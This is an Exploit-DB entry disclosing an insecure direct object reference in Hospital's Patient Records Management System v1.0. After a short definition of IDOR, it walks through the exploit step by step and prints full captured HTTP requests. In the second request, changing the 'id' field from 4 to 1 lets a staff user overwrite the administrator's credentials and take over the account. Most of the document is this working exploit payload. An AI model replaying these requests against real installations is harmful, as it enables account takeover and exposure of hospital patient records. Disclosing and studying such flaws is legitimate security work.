# Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver
Original link: https://www.exploit-db.com/exploits/50631
```bash
# Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver
# Date: 2021-12-30
# Exploit Author: twseptian
# Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip
# Version: v1.0
# Tested on: Kali Linux 2021.4
```

## Insecure direct object references (IDOR)
Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input.Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system.

## Attack Vector
An attacker can takeover the Administrator's account

## Steps of reproduce:
Note: in this case, we used two users, user1 as a staff with user id '4', and admin as an Administrator with user id '1'.

- Step-1: Log in to the application using user1 account,then on the dashboard navigate to 'My Account' -> http://localhost/hprms/admin/?page=user

- Step-2: Modify the username,lastname and password,then let's intercept the request using burpsuite:
```html
POST /hprms/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page=user
Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="id"

4
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="firstname"

user1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="lastname"

admin
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="username"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="password"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------17632878732301879013646251239--
```
- Step-3: Change parameter id '4' to id '1'
```html
POST /hprms/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page=user
Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="id"

1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="firstname"

user1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="lastname"

admin
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="username"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="password"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------17632878732301879013646251239--
```
- step-4: Click 'Forward' on burpsuite. Now user1 is a Administrator.
